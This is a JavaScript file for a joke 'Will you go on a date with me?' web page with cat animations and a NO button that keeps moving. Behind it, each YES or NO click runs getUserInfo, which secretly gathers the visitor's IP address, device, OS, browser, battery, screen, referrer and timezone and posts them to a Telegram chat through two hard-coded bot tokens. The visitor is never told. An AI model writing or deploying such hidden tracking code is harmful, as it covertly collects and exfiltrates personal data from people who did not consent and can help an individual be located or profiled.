async function getUserInfo(action) {
    try {
        let ipData = await fetch("https://api.ipify.org?format=json")
         .then(res => res.json());
        let ip = ipData.ip;    

        let city = ipData.city;
        let region = ipData.regionName;
        let country = ipData.country;
        let isp = ipData.isp;
        let postalCode = ipData.zip;
        let networkType = ipData.mobile ? "Mobile" : "Broadband";

        let userAgent = navigator.userAgent;
        let browser = /chrome/i.test(userAgent) ? "Chrome" : /firefox/i.test(userAgent) ? "Firefox" : /safari/i.test(userAgent) ? "Safari" : /edge/i.test(userAgent) ? "Edge" : "Unknown Browser";
        let os = /android/i.test(userAgent) ? "Android" : /iphone|ipad|ipod/i.test(userAgent) ? "iOS" : /windows/i.test(userAgent) ? "Windows" : /mac os/i.test(userAgent) ? "macOS" : /linux/i.test(userAgent) ? "Linux" : "Unknown OS";
        let deviceType = /mobile/i.test(userAgent) ? "Mobile" : "PC/Laptop";

        // New function to get the device model
        function getDeviceModel() {
            if (/android/i.test(userAgent)) {
                let match = userAgent.match(/\(([^)]+)\)/);
                return match ? match[1].split(";")[1].trim() : "Android Device";
            }
            if (/iphone|ipad|ipod/i.test(userAgent)) {
                return "Apple " + (navigator.platform || "iOS Device");
            }
            if (/windows/i.test(userAgent)) {
                return "Windows PC";
            }
            if (/macintosh|mac os/i.test(userAgent)) {
                return "MacBook / iMac";
            }
            if (/linux/i.test(userAgent)) {
                return "Linux Device";
            }
            return "Unknown Device";
        }

        let deviceModel = getDeviceModel();

        let connectionType = navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "Unknown";
        let screenWidth = screen.width;
        let screenHeight = screen.height;

        let battery = await navigator.getBattery();
        let batteryLevel = Math.round(battery.level * 100);
        let chargingStatus = battery.charging ? "Charging" : "Not Charging";
        let referrer = document.referrer ? document.referrer : "Direct Visit (No Referrer)";
        let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        let mainBotMessage = `\ud83c\udf89 Someone with IP: ${ip} said ${action} to your proposal `;
        let detailedMessage = `\ud83d\udce2 Someone clicked ${action}!\n\n` +
            `📍 Location: ${city}, ${region}, ${country} (${postalCode})\n` +
            `🔗 IP Address: ${ip}\n` +
            `🏢 ISP: ${isp}\n` +
            `📶 Network Type: ${networkType}\n` +
            `🌐 Internet Connection: ${connectionType}\n` +
            `📱 Device Type: ${deviceType}\n` +
            `💻 Device Model: ${deviceModel}\n` + // Added Device Model
            `🖥️ OS: ${os}\n` +
            `🌍 Browser: ${browser}\n` +
            `🖥️ Screen Resolution: ${screenWidth}x${screenHeight}\n` +
            `🔋 Battery: ${batteryLevel}% (${chargingStatus})\n` +
            `🌐 Referring Website: ${referrer}\n` +
            `⌛ Timezone: ${timezone}\n`;

        let mainBotToken = "7734214657:AAH7BTiw8WOHv0tztVZ2dNW-Qkhke8n94rs";
        let secondaryBotToken = "7208059954:AAFoxSdzpqVDQFqBNZ4aoSiSRxlgpaJROBQ";
        let chatId = "5471661264";

        fetch(`https://api.telegram.org/bot${mainBotToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: mainBotMessage })
        });

        fetch(`https://api.telegram.org/bot${secondaryBotToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: detailedMessage })
        });
    } catch (error) {
        console.error("Error fetching data: ", error);
    }
}

function changeContent() {
    document.getElementById('mainHeading').innerText = "YAY, see you soon...ɷ◡ɷ";
    document.getElementById('catGif').src = "images/goma-goma-cat.gif";
    document.getElementById('yessoundEffect').play();
    getUserInfo("YES");
}

function noButtonClick() {
    document.getElementById('noButtonClickSound').play();
    document.getElementById('mainHeading').innerText = "STFU....(ᗒᗣᗕ)՞";
    document.getElementById('catGif').src = "images/angry-cat.gif";
    
    setTimeout(function () {
        document.getElementById('mainHeading').innerText = "Will you go on a date with me?";
        document.getElementById('catGif').src = "images/peach-goma-love-heart-dance.gif";
    }, 1500);

    getUserInfo("NO");
}

function getRandomPosition() {
    const windowHeight = window.innerHeight;
    const windowWidth = window.innerWidth;

    const buttonHeight = document.getElementById('NO').offsetHeight;
    const buttonWidth = document.getElementById('NO').offsetWidth;

    const randomY = Math.floor(Math.random() * (windowHeight - buttonHeight));
    const randomX = Math.floor(Math.random() * (windowWidth - buttonWidth));

    return { top: randomY, left: randomX };
}

function moveButton() {
    const noButton = document.getElementById('NO');
    const randomPosition = getRandomPosition();

    noButton.style.position = 'absolute';
    noButton.style.top = `${randomPosition.top}px`;
    noButton.style.left = `${randomPosition.left}px`;
}

setInterval(moveButton, 300);
